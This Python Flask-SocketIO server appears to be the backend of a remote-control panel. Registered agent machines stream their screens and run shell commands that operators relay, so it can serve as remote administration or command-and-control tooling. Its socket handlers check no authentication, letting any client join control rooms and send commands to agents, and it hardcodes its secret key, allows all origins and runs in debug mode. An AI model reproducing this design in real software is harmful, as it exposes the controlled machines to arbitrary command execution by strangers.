from flask import Flask,render_template,send_from_directory,redirect,request,make_response,url_for
from flask_socketio import SocketIO, join_room, leave_room, send
import json
import base64
import io
from PIL import Image
import time
import eventlet
import database
import bcrypt
import secrets
import json

with open('config.json') as json_file:
    data = json.load(json_file)

#Defined in config.json
socket_url = data["socket_url"]
socket_port = data["socket_port"]
server_host = data["server_host"]
server_port = data["server_port"]


app = Flask(__name__)
app.config['SECRET_KEY'] = 'Will is a busy bee 34gwner6454yestr5s546sw3sxsznn33sn3645wn564767554ys34s6et'
socketio = SocketIO(app, cors_allowed_origins='*', ping_timeout=10, ping_interval=5,transport_protocols=['websocket'])

#List of connected agents
agents = []


@socketio.on('Server_Connection')
def Server_Connection(data):
    join_room('server')
    join_room('server')
    print('received json: ' + str(data))
    socketio.emit('Server_Connection_Bot',data)
    socketio.emit('Agents',json.dumps({'content':'Hello From The Server','agents':agents}),to='server')
    

@socketio.on('establish_agent')
def establish_agent(content):
    data = json.loads(content)
    if data.get('type') == 'client_agent':
        server_sid = request.sid  # Get the real server-generated SID
        data['sid'] = server_sid  # Overwrite or set correct SID
        agents.append(data)
        join_room(server_sid)
        join_room(server_sid+'control')
        print(data)
        send('Room Established', to=server_sid)
        socketio.emit('new_agent_created', data, to='server')


        
@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    print(f"Agent disconnected (auto): {sid}")
    for agent in agents:
        if agent['sid'] == sid:
            socketio.emit('agent_disconnect',json.dumps(agent),to='server')
            agents.remove(agent)

#debug stuff
@socketio.on('connect')
def handle_connect():
    sid = request.sid
    print(f'New connection: {sid}')
    socketio.emit('server_sid', {'sid': sid}, to=sid)


@socketio.on('Control_Machine')
def Control_Machine(data):
    room = json.loads(data).get('room')
    print(room)
    join_room(room+'control')

@socketio.on('signal_sharing')
def signal_sharing(data):
    target_room = data['room']  
    print(f"Starting screen sharing for room (client): {target_room}")
    socketio.emit('start_screen_sharing',data, room=target_room)


@socketio.on('screenshot_frame')
def handle_screenshot_frame(image_bytes):
    #print(f"🖼️ Received image of size: {len(image_bytes)} bytes from {request.sid}")
    try:
        socketio.emit('screenshot_stream', image_bytes,to=request.sid+'control')
        
    except Exception as e:
        print(f"Error processing screenshot: {e}")

@socketio.on('execute_command')
def execute_command(data):
    input = json.loads(data)
    command = input['command']
    socketio.emit('execute_command', json.dumps({'command': command}),to=input['room'])

@socketio.on('command_output')
def handle_command_output(data):
    print(data)
    sid = request.sid
    if 'error' in data:
        print(f"Error: {data['error']}")
    if 'output' in data:
        print(f"Output: {data['output']}")
    socketio.emit('command_output_log',data,to=sid+'control')

        

@app.route('/<path:path>')
def send_static(path):
    response = make_response(send_from_directory('static', path), 200)
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/machines')
def machines():
    auth = request.cookies.get('auth')
    check = database.check_token(auth)
    if check == False:
        response = make_response(redirect('/'))
        response.set_cookie('auth',max_age=0,value='')
        return response
    return render_template('machines.html', socket_url=socket_url,socket_port=socket_port)



@app.route('/machine/<path:id>')
def machine_options(id):
    auth = request.cookies.get('auth')
    check = database.check_token(auth)
    if check == False:
        response = make_response(redirect('/'))
        response.set_cookie('auth',max_age=0,value='')
        return response

    data = {'id':id}
    for agent in agents:
        if agent.get('sid') == id:
            data = agent
    return render_template('control_pane.html',data=data,socket_url=socket_url,socket_port=socket_port)


@app.route('/login', methods=["POST"])
def login():
    pw = request.form.get('password')
    ur = request.form.get('username')
    hash = database.get_user_by_username(ur)
    if hash != None:
        check = bcrypt.checkpw(pw.encode(),hash.passhash)
        if check:
            token = secrets.token_hex()
            database.set_user_token(ur,token)
            response = make_response(redirect(url_for('machines')))
            response.set_cookie('auth', token,httponly=True, max_age=3600)
            return response
        else:
            return redirect('/')
    else:
        return redirect('/')

@app.route('/logout')
def logout():
    response = make_response(redirect('/'))
    response.set_cookie('auth',max_age=0,value='')
    return response

if __name__ == '__main__':
    socketio.run(app, host=server_host, port=server_port, debug=True)